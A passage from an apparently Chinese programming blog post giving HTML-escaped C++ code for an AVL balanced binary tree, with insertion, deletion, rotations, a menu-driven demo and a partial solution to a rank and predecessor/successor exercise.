n=n-1; while(n) &#123; S=new Node&lt;ElementType&gt;; S-&gt;data=A[i]; S-&gt;balanceFctor=0; S-&gt;lChild=NULL; S-&gt;rChild=NULL; insert(p,S); AllAdjust(T); p=T; i++; n--; &#125;&#125;//查找元素xtemplate&lt;class ElementType&gt;void BalanceBiTree&lt;ElementType&gt;::search(Node &lt;ElementType&gt; *&amp;T,Node &lt;ElementType&gt; *&amp;p,ElementType x)&#123; if(T) &#123; if(T-&gt;data==x) p=T; search(T-&gt;lChild,p,x); search(T-&gt;rChild,p,x); &#125;&#125; //获取某个元素的父亲指针，不存在返回NULLtemplate&lt;class ElementType&gt;Node &lt;ElementType&gt; * BalanceBiTree&lt;ElementType&gt;::getElementFatherPointer(Node &lt;ElementType&gt; *&amp;T,Node &lt;ElementType&gt; *&amp;f,ElementType x)&#123; if(T) &#123; if(T-&gt;lChild!=NULL) &#123; if(T-&gt;lChild-&gt;data==x) f=T; &#125; if(T-&gt;rChild!=NULL) &#123; if(T-&gt;rChild-&gt;data==x) f=T; &#125; getElementFatherPointer(T-&gt;lChild,f,x); getElementFatherPointer(T-&gt;rChild,f,x); &#125;&#125;//获取前驱元素template&lt;class ElementType&gt;void BalanceBiTree&lt;ElementType&gt;::getPriorElement(Node &lt;ElementType&gt; *&amp;T,ElementType &amp;min,ElementType &amp;max)&#123; if(T) &#123; min=T-&gt;data; if(min&gt;max) max=min; getPriorElement(T-&gt;lChild,min,max); getPriorElement(T-&gt;rChild,min,max); &#125;&#125;//获取某个元素的前驱指针template&lt;class ElementType&gt;Node &lt;ElementType&gt; * BalanceBiTree&lt;ElementType&gt;::getElementPriorPointer(Node &lt;ElementType&gt; *&amp;T)&#123; Node &lt;ElementType&gt; *p; ElementType min=0,max=-9999; getPriorElement(T,min,max); search(T,p,max); return p;&#125;//获取后继元素 template&lt;class ElementType&gt;void BalanceBiTree&lt;ElementType&gt;::getNextElement(Node &lt;ElementType&gt; *&amp;T,ElementType &amp;min,ElementType &amp;max)&#123; if(T) &#123; max=T-&gt;data; if(min&gt;max) min=max; getNextElement(T-&gt;lChild,min,max); getNextElement(T-&gt;rChild,min,max); &#125;&#125;//获取某个元素的后继指针template&lt;class ElementType&gt;Node &lt;ElementType&gt; * BalanceBiTree&lt;ElementType&gt;::getElementNextPointer(Node &lt;ElementType&gt; *&amp;T)&#123; Node &lt;ElementType&gt; *p; ElementType min=9999,max=0; getNextElement(T,min,max); search(T,p,min); return p;&#125;//删除叶子节点操作template&lt;class ElementType&gt;void BalanceBiTree&lt;ElementType&gt;::deleteLeafNode(Node &lt;ElementType&gt; *&amp;T,Node &lt;ElementType&gt; *&amp;p,Node &lt;ElementType&gt; *&amp;f)&#123; if(p==NULL) &#123; cout&lt;&lt;&quot;此节点不存在，不能删除&quot;&lt;&lt;endl; return; &#125; if(T==p) //根节点即为叶子节点 &#123; delete p; T=NULL; &#125; else&#123; //删除节点为非根节点的叶子节点 if(f-&gt;lChild==p) &#123; delete p; f-&gt;lChild=NULL; &#125; if(f-&gt;rChild==p) &#123; delete p; f-&gt;rChild=NULL; &#125; &#125;&#125;//删除仅有左子树或只有右子树的节点template&lt;class ElementType&gt;void BalanceBiTree&lt;ElementType&gt;::deleteOneBranchNode(Node &lt;ElementType&gt; *&amp;T,Node &lt;ElementType&gt; *&amp;p,Node &lt;ElementType&gt; *&amp;f)&#123; if(p==NULL) &#123; cout&lt;&lt;&quot;此节点不存在，不能删除&quot;&lt;&lt;endl; return; &#125; if(T==p) &#123; if(T-&gt;lChild==NULL&amp;&amp;T-&gt;rChild!=NULL) &#123; T=p-&gt;rChild; delete p; &#125; if(T-&gt;rChild==NULL&amp;&amp;T-&gt;lChild!=NULL) &#123; T=p-&gt;lChild; delete p; &#125; &#125; else&#123; if(p-&gt;lChild!=NULL) &#123; if(f-&gt;lChild==p) f-&gt;lChild=p-&gt;lChild; else f-&gt;rChild=p-&gt;lChild; &#125; if(p-&gt;rChild!=NULL) &#123; if(f-&gt;lChild==p) f-&gt;lChild=p-&gt;rChild; else f-&gt;rChild=p-&gt;rChild; &#125; &#125;&#125;//删除既有左子树又有右子树的节点template&lt;class ElementType&gt;void BalanceBiTree&lt;ElementType&gt;::deleteTwoBranchNode(Node &lt;ElementType&gt; *&amp;T,Node &lt;ElementType&gt; *&amp;p)&#123; Node &lt;ElementType&gt; *f,*next,*prior; if(p==NULL) &#123; cout&lt;&lt;&quot;此节点不存在，不能删除&quot;&lt;&lt;endl; return; &#125; if(p-&gt;balanceFctor==1) //p的平衡因子为1时，用p的前驱节点代替p &#123; prior=getElementPriorPointer(p-&gt;lChild); //获得x的前驱指针 if(prior-&gt;lChild!=NULL&amp;&amp;prior-&gt;rChild==NULL) //情况一前驱节点只有左孩子 &#123; p-&gt;data=prior-&gt;data; prior-&gt;data=prior-&gt;lChild-&gt;data; delete prior-&gt;lChild; prior-&gt;lChild=NULL; &#125; if(prior-&gt;lChild==NULL&amp;&amp;prior-&gt;rChild==NULL) //情况二前驱节点为叶子节点 &#123; getElementFatherPointer(T,f,prior-&gt;data); //得到前驱节点的父节点 p-&gt;data=prior-&gt;data; delete prior; f-&gt;rChild=NULL; &#125; &#125; else if(p-&gt;balanceFctor==-1) //p的平衡因子为-1时，用p的后继节点代替p &#123; next=getElementNextPointer(p-&gt;rChild); //获得x的后继指针 cout&lt;&lt;next-&gt;data; int level=1; if(next-&gt;rChild!=NULL&amp;&amp;next-&gt;lChild==NULL) //情况一后继节点只有右孩子 &#123; p-&gt;data=next-&gt;data; next-&gt;data=next-&gt;rChild-&gt;data; delete next-&gt;rChild; next-&gt;rChild=NULL; &#125; else if(next-&gt;rChild==NULL&amp;&amp;next-&gt;lChild==NULL) //情况二后继节点为叶子节点 &#123; getElementFatherPointer(T,f,next-&gt;data); //得到后继节点的父节点 p-&gt;data=next-&gt;data; delete next; f-&gt;lChild=NULL; &#125; &#125; else if(p-&gt;balanceFctor==0) //p的平衡因子为0时，用p的前驱或后继节点代替p，这里用前驱 &#123; prior=getElementPriorPointer(p-&gt;lChild); //获得x的前驱指针 if(prior-&gt;lChild!=NULL&amp;&amp;prior-&gt;rChild==NULL) //情况一前驱节点只有左孩子 &#123; p-&gt;data=prior-&gt;data; prior-&gt;data=prior-&gt;lChild-&gt;data; delete prior-&gt;lChild; prior-&gt;lChild=NULL; &#125; if(prior-&gt;lChild==NULL&amp;&amp;prior-&gt;rChild==NULL) //情况二前驱节点为叶子节点 &#123; getElementFatherPointer(T,f,prior-&gt;data); //得到前驱节点的父节点 p-&gt;data=prior-&gt;data; delete prior; if(p==f) //这块需要特殊记忆，唯独p-&gt;balanceFctor==0需要考虑*** f-&gt;lChild=NULL; else f-&gt;rChild=NULL; &#125; &#125;&#125;//集成删除的三种情况的操作template&lt;class ElementType&gt;void BalanceBiTree&lt;ElementType&gt;::deleteOperate(Node &lt;ElementType&gt; *&amp;T,ElementType x)&#123; Node &lt;ElementType&gt; *f,*p=NULL; search(T,p,x); getElementFatherPointer(T,f,x); if(p==NULL) &#123; cout&lt;&lt;&quot;不存在此节点，删除失败！&quot;&lt;&lt;endl; return; &#125; if(p-&gt;lChild==NULL&amp;&amp;p-&gt;rChild==NULL) //情况一删除节点为叶子节点 &#123; deleteLeafNode(T,p,f); if(T!=NULL) AllAdjust(T); &#125; else if((p-&gt;lChild==NULL&amp;&amp;p-&gt;rChild!=NULL)||(p-&gt;lChild!=NULL&amp;&amp;p-&gt;rChild==NULL)) &#123; deleteOneBranchNode(T,p,f); if(T!=NULL) AllAdjust(T); &#125; else //if(p-&gt;lChild!=NULL&amp;&amp;p-&gt;rChild!=NULL) &#123; deleteTwoBranchNode(T,p); if(T!=NULL) AllAdjust(T); &#125;&#125;#endif // _BALANCEBITREE_H_ # 4.2 食用实例 行高亮123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144#include &lt;iostream&gt;#include &lt;Cstdlib&gt;#include &quot;BalanceBiTree.h&quot; using namespace std; //数组、顺序表的二分查找template&lt;class ElementType&gt;int BinarySearch(ElementType A[],int n,ElementType x)&#123; int mid,low=0,high=n-1; while(low&lt;=high) &#123; mid=(low+high)/2; if(x==A[mid]) &#123; return mid; &#125; else if(x&lt;A[mid]) &#123; high=mid-1; &#125; else&#123; low=mid+1; &#125; &#125; return -1;&#125;//初始化数组void initArray(int A[])&#123; int i=0; for(i;i&lt;100;i++) A[i]=0;&#125;int main()&#123; int x,y; int i=1; int level=1; int A[100]=&#123;0&#125;; int B[100]=&#123;0&#125;; int length=0; //存储数组A的有效元素个数 Node&lt;int&gt; * root; Node&lt;int&gt; * p; BalanceBiTree&lt;int&gt; T(root); BalanceBiTree&lt;int&gt;::menu(); cout&lt;&lt;&quot;请输入执行序号：&quot;; cin&gt;&gt;x; while(x!=0) &#123; switch(x) &#123; case 1: if(root!=NULL) T.destory(root); length=0; cout&lt;&lt;&quot;请输入数组元素的值：&quot;; cin&gt;&gt;y; while(y!=-9999) &#123; A[length]=y; length++; cout&lt;&lt;&quot;请输入数组元素的值：&quot;; cin&gt;&gt;y; &#125; cout&lt;&lt;&quot;请输入要查询元素的值：&quot;; cin&gt;&gt;x; if(BinarySearch(A,length+1,x)==-1) cout&lt;&lt;&quot;不存i=1;在！&quot;&lt;&lt;endl; else&#123; cout&lt;&lt;&quot;存在，其下标为：&quot;&lt;&lt;BinarySearch(A,length+1,x)&lt;&lt;endl; &#125; break; case 2: T.createSubBalanceBiTree(root); break; case 3: cout&lt;&lt;&quot;请输入要查询元素的值：&quot;; cin&gt;&gt;x; T. search(root,p,x); if(p!=NULL) &#123; if(p-&gt;data==x) cout&lt;&lt;&quot;元素存在！&quot;&lt;&lt;endl; else cout&lt;&lt;&quot;元素不存在！&quot;&lt;&lt;endl; &#125; else&#123; cout&lt;&lt;&quot;元素不存在！&quot;&lt;&lt;endl; &#125; break; case 4: i=1; initArray(A); level=1; cout&lt;&lt;&quot;请输入要删除元素的值：&quot;; cin&gt;&gt;x; T.deleteOperate(root,x); T.inOrderTraverse(root,level); T.BiTreeToArray(root,A,i,length); cout&lt;&lt;&quot;其树状图为：&quot;&lt;&lt;endl; T.LevelTraverse(root,A,length); break; case 5: initArray(A); if(root!=NULL) T.destory(root); length=0; y=1; for(y;y&lt;=26;y++) &#123; A[length]=y; length++; &#125; T.createBalanceBiTreeFromArray(root, A,length); level=1; i=1; T.inOrderTraverse(root,level); cout&lt;&lt;endl; initArray(A); T.BiTreeToArray(root,A,i,length); cout&lt;&lt;&quot;其树状图为：&quot;&lt;&lt;endl; T.LevelTraverse(root,A,length); break; case 6: i=1; initArray(A); T.AllAdjust(root); T.BiTreeToArray(root,A,i,length); cout&lt;&lt;&quot;其树状图为：&quot;&lt;&lt;endl; T.LevelTraverse(root,A,length); break; &#125; system(&quot;PAUSE&quot;); system(&quot;CLS&quot;); BalanceBiTree&lt;int&gt;::menu(); cout&lt;&lt;&quot;请输入执行序号：&quot;; cin&gt;&gt;x; &#125; if(root!=NULL) T.destory(root); return 0;&#125; # 4.3 本题题解 这道题，搓了一个小时，服了 行高亮123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299300301302303304305306307308309310311312313314315316317318319320321322323324325326327328329330331332333334335336337338339340341342343344345346347348349350351352353354355356357358359360361362363364365366367368369370371372373374375376377378379380381382383384385386387388389390391392393394395396397398399400401402403404405406407408409410411412413414415416417418419420421422423424425426427428429430431432433434435436437438439440441442443444445446447448449450451452453454455456457458459460461462463464465466467468469470471472473474475476477478479480481482483484485486487488489490491492493494495496497498499500501502503504505506507508509510511512513514515516517518519520521522523524525526527528529530531532533534535536537538539540541542543544545546547548549550551552553554555/*4: 普通二叉树描述您需要写一种数据结构，来维护一些数（都是 1e9 以内的数字）的集合，最开始时集合是空的。其中需要提供以下操作，操作次数 q 不超过 104：1.查询值为x的数的排名（排名定义为比当前数小的数的个数 +1。若有多个相同的数，应输出最小的排名）。2.查询排名为 x 的数。3.求 x 的前驱（前驱定义为小于 x，且最大的数）。若未找到则输出−2147483647。4.求 x 的后继（后继定义为大于 x，且最小的数）。若未找到则输出 2147483647。5.插入一个数 x。输入第一行是一个整数 q，表示操作次数。接下来 q 行，每行两个整数 op,x，分别表示操作序号以及操作的参数 x。输出输出有若干行。对于操作 1,2,3,4输出一个整数，表示该操作的结果。样例输入75 15 35 51 32 23 34 3输出2315*//*常规思路观察题目，题目的想法是想让我们写一颗可以插入和查询的平衡二叉树*/#include &lt;iostream&gt;#include &lt;vector&gt;using namespace std;//typedef int ElementType;template&lt;class ElementType&gt;struct Node &#123; ElementType data; struct Node* lChild; struct Node* rChild; int balanceFactor; //平衡因子&#125;;template&lt;class ElementType&gt;class BalanceBiTree &#123;//平衡二叉树的所有操作public: BalanceBiTree(Node&lt;ElementType&gt;*&amp; T); //初始化 void destory(Node&lt;ElementType&gt;*&amp; T); //销毁二叉树 void insert(Node&lt;ElementType&gt;*&amp; T, Node&lt;ElementType&gt;* S); //将指针S所指节点插入二叉排序中 int BiTreeDepth(Node &lt;ElementType&gt;* T); //求树的高度 int getNodeFactor(Node&lt;ElementType&gt;* T); //求树中节点的平衡因子 void factorForTree(Node&lt;ElementType&gt;*&amp; T); //求树中的每个节点的平衡因子 void nodeFctorIsTwo(Node&lt;ElementType&gt;*&amp; T, Node&lt;ElementType&gt;*&amp; p); //获得平衡因子为2或-2的节点 void nodeFctorIsTwoFather(Node&lt;ElementType&gt;*&amp; T, Node&lt;ElementType&gt;*&amp; f); //获得平衡因子为2或-2的节点的父节点 void LLAdjust(Node&lt;ElementType&gt;*&amp; T, Node&lt;ElementType&gt;*&amp; p, Node&lt;ElementType&gt;*&amp; f); //LL调整 void LRAdjust(Node&lt;ElementType&gt;*&amp; T, Node&lt;ElementType&gt;*&amp; p, Node&lt;ElementType&gt;*&amp; f); //LR调整 void RLAdjust(Node&lt;ElementType&gt;*&amp; T, Node&lt;ElementType&gt;*&amp; p, Node&lt;ElementType&gt;*&amp; f); //RL调整 void RRAdjust(Node&lt;ElementType&gt;*&amp; T, Node&lt;ElementType&gt;*&amp; p, Node&lt;ElementType&gt;*&amp; f); //RR调整 void AllAdjust(Node&lt;ElementType&gt;*&amp; T); //集成四种调整，并实时更新平衡因子 //1查x的排名 int searchXRank(Node&lt;ElementType&gt;* T, int x); //1中序遍历辅助函数 void inorderTraversal(Node&lt;ElementType&gt;* T, ElementType x, int&amp; rank, bool&amp; found); //2查找排名为 x 的值 ElementType searchRankValue(Node&lt;ElementType&gt;* T, int x); // 中序遍历辅助函数， void inorderTraversalForRank(Node&lt;ElementType&gt;* T, int x, int&amp; currentRank, ElementType&amp; result); //3.前驱 ElementType findPredecessor(Node&lt;ElementType&gt;* T, ElementType x); //4后继 ElementType findSuccessor(Node&lt;ElementType&gt;* T, ElementType x); //5 交互创建二叉平衡树 void createSubBalanceBiTree(Node&lt;ElementType&gt;*&amp; T, ElementType x); private: Node&lt;ElementType&gt;* root; //树根&#125;;//初始化template&lt;class ElementType&gt;BalanceBiTree&lt;ElementType&gt;::BalanceBiTree(Node&lt;ElementType&gt;*&amp; T)&#123; T = NULL;&#125;//销毁二叉树template&lt;class ElementType&gt;void BalanceBiTree&lt;ElementType&gt;::destory(Node&lt;ElementType&gt;*&amp; T)&#123; if (T) &#123; destory(T-&gt;lChild); destory(T-&gt;rChild); delete T; &#125;&#125;//将指针S所指节点插入二叉排序中template&lt;class ElementType&gt;void BalanceBiTree&lt;ElementType&gt;::insert(Node&lt;ElementType&gt;*&amp; T, Node&lt;ElementType&gt;* S)&#123; if (T == NULL) T = S; else if (S-&gt;data &lt; T-&gt;data) insert(T-&gt;lChild, S); else insert(T-&gt;rChild, S);&#125;//求树的高度template&lt;class ElementType&gt;int BalanceBiTree&lt;ElementType&gt;::BiTreeDepth(Node &lt;ElementType&gt;* T)&#123; int m, n; if (T == NULL) return 0; //空树，高度为0 else &#123; m = BiTreeDepth(T-&gt;lChild); //求左子树高度（递归） n = BiTreeDepth(T-&gt;rChild); //求右子树高度（递归） if (m &gt; n) &#123; return m + 1; &#125; else &#123; return n + 1; &#125; &#125;&#125;//求树中节点的平衡因子template&lt;class ElementType&gt;int BalanceBiTree&lt;ElementType&gt;::getNodeFactor(Node&lt;ElementType&gt;* T)&#123; int m = 0, n = 0; if (T) &#123; m = BiTreeDepth(T-&gt;lChild); n = BiTreeDepth(T-&gt;rChild); &#125; return m - n;&#125;//求树中的每个节点的平衡因子template&lt;class ElementType&gt;void BalanceBiTree&lt;ElementType&gt;::factorForTree(Node&lt;ElementType&gt;*&amp; T)&#123; if (T) &#123; T-&gt;balanceFactor = getNodeFactor(T); factorForTree(T-&gt;lChild); factorForTree(T-&gt;rChild); &#125;&#125;//获得平衡因子为2或-2的节点template&lt; class ElementType&gt;void BalanceBiTree&lt;ElementType&gt;::nodeFctorIsTwo(Node&lt;ElementType&gt;*&amp; T, Node&lt;ElementType&gt;*&amp; p)&#123; if (T) &#123; if (T-&gt;balanceFactor == 2 || T-&gt;balanceFactor == -2) &#123; p = T; &#125; nodeFctorIsTwo(T-&gt;lChild, p); nodeFctorIsTwo(T-&gt;rChild, p); &#125;&#125;//获得平衡因子为2或-2的节点的父节点template&lt;class ElementType&gt;void BalanceBiTree&lt;ElementType&gt;::nodeFctorIsTwoFather(Node&lt;ElementType&gt;*&amp; T, Node&lt;ElementType&gt;*&amp; f)&#123; if (T) &#123; if (T-&gt;lChild != NULL) &#123; if (T-&gt;lChild-&gt;balanceFactor == 2 || T-&gt;lChild-&gt;balanceFactor == -2) &#123; f = T; &#125; &#125; if (T-&gt;rChild != NULL) &#123; if (T-&gt;rChild-&gt;balanceFactor == 2 || T-&gt;rChild-&gt;balanceFactor == -2) &#123; f = T; &#125; &#125; nodeFctorIsTwoFather(T-&gt;lChild, f); nodeFctorIsTwoFather(T-&gt;rChild, f); &#125;&#125;//LL调整template&lt; class ElementType&gt;void BalanceBiTree&lt;ElementType&gt;::LLAdjust(Node&lt;ElementType&gt;*&amp; T, Node&lt;ElementType&gt;*&amp; p, Node&lt;ElementType&gt;*&amp; f)&#123; Node&lt;ElementType&gt;* r; if (T == p) //-&gt;balanceFctor==2&amp;&amp;T-&gt;lChild-&gt;balanceFctor!=2 &#123; //cout &lt;&lt; &quot;LL调整&quot; &lt;&lt; endl; T = p-&gt;lChild; //将P的左孩子提升为新的根节点 r = T-&gt;rChild; T-&gt;rChild = p; //将p降为其左孩子的右孩子 p-&gt;lChild = r; //将p原来的左孩子的右孩子连接其p的左孩子 &#125; else &#123; if (f-&gt;lChild == p) //f的左孩子是p &#123; // cout &lt;&lt; &quot;LL调整&quot; &lt;&lt; endl; f-&gt;lChild = p-&gt;lChild; //将P的左孩子提升为新的根节点 r = f-&gt;lChild-&gt;rChild; f-&gt;lChild-&gt;rChild = p; //将p降为其左孩子的右孩子 p-&gt;lChild = r; //将p原来的左孩子的右孩子连接其p的左孩子 &#125; if (f-&gt;rChild == p) //f的左孩子是p &#123; // cout &lt;&lt; &quot;LL调整&quot; &lt;&lt; endl; f-&gt;rChild = p-&gt;lChild; //将P的左孩子提升为新的根节点 r = f-&gt;rChild-&gt;rChild; f-&gt;rChild-&gt;rChild = p; //将p降为其左孩子的右孩子 p-&gt;lChild = r; //将p原来的左孩子的右孩子连接其p的左孩子 &#125; &#125;&#125;//LR调整template&lt; class ElementType&gt;void BalanceBiTree&lt;ElementType&gt;::LRAdjust(Node&lt;ElementType&gt;*&amp; T, Node&lt;ElementType&gt;*&amp; p, Node&lt;ElementType&gt;*&amp; f)&#123; Node&lt;ElementType&gt;* l, * r; if (T == p) //-&gt;balanceFctor==2&amp;&amp;T-&gt;lChild-&gt;balanceFctor!=2 &#123; //cout &lt;&lt; &quot;LR调整&quot; &lt;&lt; endl; T = p-&gt;lChild-&gt;rChild; //将P的左孩子的右孩子提升为新的根节点 r = T-&gt;rChild; l = T-&gt;lChild; T-&gt;rChild = p; T-&gt;lChild = p-&gt;lChild; T-&gt;lChild-&gt;rChild = l; T-&gt;rChild-&gt;lChild = r; &#125; else &#123; if (f-&gt;rChild == p) //f的左孩子是p &#123; // cout &lt;&lt; &quot;LR调整&quot; &lt;&lt; endl; f-&gt;rChild = p-&gt;lChild-&gt;rChild; //将P的左孩子的右孩子提升为新的根节点 r = f-&gt;rChild-&gt;rChild; l = f-&gt;rChild-&gt;lChild; f-&gt;rChild-&gt;rChild = p; f-&gt;rChild-&gt;lChild = p-&gt;lChild; f-&gt;rChild-&gt;lChild-&gt;rChild = l; f-&gt;rChild-&gt;rChild-&gt;lChild = r; &#125; if (f-&gt;lChild == p) //f的左孩子是p &#123; // cout &lt;&lt; &quot;LR调整&quot; &lt;&lt; endl; f-&gt;lChild = p-&gt;lChild-&gt;rChild; //将P的左孩子的右孩子提升为新的根节点 r = f-&gt;lChild-&gt;rChild; l = f-&gt;lChild-&gt;lChild; f-&gt;lChild-&gt;rChild = p; f-&gt;lChild-&gt;lChild = p-&gt;lChild; f-&gt;lChild-&gt;lChild-&gt;rChild = l; f-&gt;lChild-&gt;rChild-&gt;lChild = r; &#125; &#125;&#125;//RL调整template&lt; class ElementType&gt;void BalanceBiTree&lt;ElementType&gt;::RLAdjust(Node&lt;ElementType&gt;*&amp; T, Node&lt;ElementType&gt;*&amp; p, Node&lt;ElementType&gt;*&amp; f)&#123; Node&lt;ElementType&gt;* l, * r; if (T == p) //-&gt;balanceFctor==-2&amp;&amp;T-&gt;rChild-&gt;balanceFctor!=-2 &#123; // cout &lt;&lt; &quot;RL调整&quot; &lt;&lt; endl; T = p-&gt;rChild-&gt;lChild; r = T-&gt;rChild; l = T-&gt;lChild; T-&gt;lChild = p; T-&gt;rChild = p-&gt;rChild; T-&gt;lChild-&gt;rChild = l; T-&gt;rChild-&gt;lChild = r; &#125; else &#123; if (f-&gt;rChild == p) //f的左孩子是p &#123; //cout &lt;&lt; &quot;RL调整&quot; &lt;&lt; endl; f-&gt;rChild = p-&gt;rChild-&gt;lChild; r = f-&gt;rChild-&gt;rChild; l = f-&gt;rChild-&gt;lChild; f-&gt;rChild-&gt;lChild = p; f-&gt;rChild-&gt;rChild = p-&gt;rChild; f-&gt;rChild-&gt;lChild-&gt;rChild = l; f-&gt;rChild-&gt;rChild-&gt;lChild = r; &#125; if (f-&gt;lChild == p) //f的左孩子是p &#123; // cout &lt;&lt; &quot;RL调整&quot; &lt;&lt; endl; f-&gt;lChild = p-&gt;rChild-&gt;lChild; r = f-&gt;lChild-&gt;rChild; l = f-&gt;lChild-&gt;lChild; f-&gt;lChild-&gt;lChild = p; f-&gt;lChild-&gt;rChild = p-&gt;rChild; f-&gt;lChild-&gt;lChild-&gt;rChild = l; f-&gt;lChild-&gt;rChild-&gt;lChild = r; &#125; &#125;&#125;//RR调整template&lt; class ElementType&gt;void BalanceBiTree&lt;ElementType&gt;::RRAdjust(Node&lt;ElementType&gt;*&amp; T, Node&lt;ElementType&gt;*&amp; p, Node&lt;ElementType&gt;*&amp; f)&#123; Node&lt;ElementType&gt;* l; if (T == p) //-&gt;balanceFctor==-2&amp;&amp;T-&gt;rChild-&gt;balanceFctor!=-2 &#123; //cout &lt;&lt; &quot;RR调整&quot; &lt;&lt; endl; T = p-&gt;rChild; //将P的右孩子提升为新的根节点 l = T-&gt;lChild; T-&gt;lChild = p; //将p降为其右孩子的左孩子 p-&gt;rChild = l; //将p原来的右孩子的左孩子连接其p的右孩子 //注意：p-&gt;rChild-&gt;balanceFctor==0插入节点时用不上，删除节点时可用 &#125; else &#123; if (f-&gt;rChild == p) //f的右孩子是p &#123; // cout &lt;&lt; &quot;RR调整&quot; &lt;&lt; endl; f-&gt;rChild = p-&gt;rChild; //将P的右孩子提升为新的根节点 l = f-&gt;rChild-&gt;lChild; f-&gt;rChild-&gt;lChild = p; //将p降为其右孩子的左孩子 p-&gt;rChild = l; //将p原来的右孩子的左孩子连接其p的右孩子 &#125; if (f-&gt;lChild == p) //f的左孩子是p &#123; // cout &lt;&lt; &quot;RR调整&quot; &lt;&lt; endl; f-&gt;lChild = p-&gt;rChild; //将P的左孩子提升为新的根节点 l = f-&gt;lChild-&gt;lChild; f-&gt;lChild-&gt;lChild = p; //将p降为其左孩子的左孩子 p-&gt;rChild = l; //将p原来的右孩子的左孩子连接其p的右孩子 &#125; &#125;&#125;//集成四种调整，并实时更新平衡因子template&lt; class ElementType&gt;void BalanceBiTree&lt;ElementType&gt;::AllAdjust(Node&lt;ElementType&gt;*&amp; T)&#123; Node&lt;ElementType&gt;* f = NULL, * p = NULL; factorForTree(T); nodeFctorIsTwoFather(T, f); nodeFctorIsTwo(T, p); while (p) &#123; factorForTree(T); if (p-&gt;balanceFactor == 2 &amp;&amp; (p-&gt;lChild-&gt;balanceFactor == 1 || p-&gt;lChild-&gt;balanceFactor == 0)) &#123; LLAdjust(T, p, f); factorForTree(T); &#125; else if (p-&gt;balanceFactor == 2 &amp;&amp; p-&gt;lChild-&gt;balanceFactor == -1) &#123; LRAdjust(T, p, f); factorForTree(T); &#125; else if (p-&gt;balanceFactor == -2 &amp;&amp; p-&gt;rChild-&gt;balanceFactor == 1) &#123; RLAdjust(T, p, f); factorForTree(T); &#125; else if (p-&gt;balanceFactor == -2 &amp;&amp; (p-&gt;rChild-&gt;balanceFactor == -1 || p-&gt;rChild-&gt;balanceFactor == 0)) //||p-&gt;rChild-&gt;balanceFctor==0 &#123; RRAdjust(T, p, f); &#125; f = NULL; p = NULL; nodeFctorIsTwoFather(T, f); nodeFctorIsTwo(T, p); &#125;&#125;//5//交互创建二叉平衡树//传入树，和这个xtemplate&lt; class ElementType&gt;void BalanceBiTree&lt;ElementType&gt;::createSubBalanceBiTree(Node&lt;ElementType&gt;*&amp; T, ElementType x) &#123; Node&lt;ElementType&gt;* S = new Node&lt;ElementType&gt;; S-&gt;data = x; S-&gt;balanceFactor = 0; S-&gt;lChild = nullptr; S-&gt;rChild = nullptr; insert(T, S); AllAdjust(T); // 修正此处，传递当前树的根节点 T&#125;//template&lt;class ElementType&gt;int BalanceBiTree&lt;ElementType&gt;::searchXRank(Node&lt;ElementType&gt;* T, int x)&#123; int rank = 0; // 记录排名 bool found = false; // 是否找到元素 x inorderTraversal(T, x, rank, found); // 调用中序遍历函数 if (found) return rank; // 返回排名（比当前数小的数的个数 + 1） else return -1; // 如果未找到元素 x，返回 -1 或其他合适的值&#125;// 辅助函数template&lt;class ElementType&gt;void BalanceBiTree&lt;ElementType&gt;::inorderTraversal(Node&lt;ElementType&gt;* T, ElementType x, int&amp; rank, bool&amp; found)&#123; if (T == nullptr || found) // 如果已经找到元素 x，停止遍历 return; inorderTraversal(T-&gt;lChild, x, rank, found); rank++; // 遍历过程中，遇到比当前数小的数，排名加一 if (T-&gt;data == x) &#123; found = true; return; &#125; inorderTraversal(T-&gt;rChild, x, rank, found);&#125;//2// 查找排名为 x 的值template&lt;class ElementType&gt;ElementType BalanceBiTree&lt;ElementType&gt;::searchRankValue(Node&lt;ElementType&gt;* T, int x)&#123; int currentRank = 0; // 当前的排名 ElementType result; // 存储查询结果 inorderTraversalForRank(T, x, currentRank, result); // 调用中序遍历函数 return result; // 返回查询结果&#125;// 中序遍历辅助函数，用于查找排名为 x 的值template&lt;class ElementType&gt;void BalanceBiTree&lt;ElementType&gt;::inorderTraversalForRank(Node&lt;ElementType&gt;* T, int x, int&amp; currentRank, ElementType&amp; result)&#123; if (T == nullptr || currentRank &gt;= x) return; inorderTraversalForRank(T-&gt;lChild, x, currentRank, result); currentRank++; // 遍历过程中，遇到一个节点，排名加一 if (currentRank == x) &#123; result = T-&gt;data; // 当前节点的值是排名为 x 的值 return; &#125; inorderTraversalForRank(T-&gt;rChild, x, currentRank, result);&#125;//3前驱template&lt;class ElementType&gt;ElementType BalanceBiTree&lt;ElementType&gt;::findPredecessor(Node&lt;ElementType&gt;* T, ElementType x)&#123; ElementType predecessor = -2147483647; // 默认前驱为 -2147483647 while (T != nullptr) &#123; if (T-&gt;data &gt;= x) &#123; T = T-&gt;lChild; // 前驱在左子树中 &#125; else &#123; predecessor = T-&gt;data; // 更新前驱 T = T-&gt;rChild; // 继续在右子树中寻找 &#125; &#125; return predecessor;&#125;//4后继template&lt;class ElementType&gt;ElementType BalanceBiTree&lt;ElementType&gt;::findSuccessor(Node&lt;ElementType&gt;* T, ElementType x)&#123; ElementType successor = 2147483647; // 默认后继为 2147483647 while (T != nullptr) &#123; if (T-&gt;data &lt;= x) &#123; T = T-&gt;rChild; // 后继在右子树中 &#125; else &#123; successor = T-&gt;data; // 更新后继 T = T-&gt;lChild; // 继续在左子树中寻找 &#125; &#125; return successor;&#125;/* //1查x的排名 int searchXRank(Node&lt;ElementType&gt;* T, int x); //1中序遍历辅助函数 void inorderTraversal(Node&lt;ElementType&gt;* T, ElementType x, int&amp; rank, bool&amp; found); //2查找排名为 x 的值 ElementType searchRankValue(Node&lt;ElementType&gt;* T, int x); // 中序遍历辅助函数， void inorderTraversalForRank(Node&lt;ElementType&gt;* T, int x, int&amp; currentRank, ElementType&amp; result); //3.前驱 ElementType findPredecessor(Node&lt;ElementType&gt;* T, ElementType x); //4后继 ElementType 